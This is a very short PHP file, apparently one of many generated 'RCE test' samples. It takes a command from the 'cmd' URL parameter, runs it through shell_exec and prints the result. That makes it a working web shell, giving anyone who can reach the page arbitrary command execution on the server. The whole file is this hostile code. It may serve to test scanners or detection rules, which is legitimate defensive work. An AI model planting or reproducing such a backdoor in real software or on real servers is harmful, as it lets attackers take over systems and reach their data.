<?php
// RCE test variation #1476
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>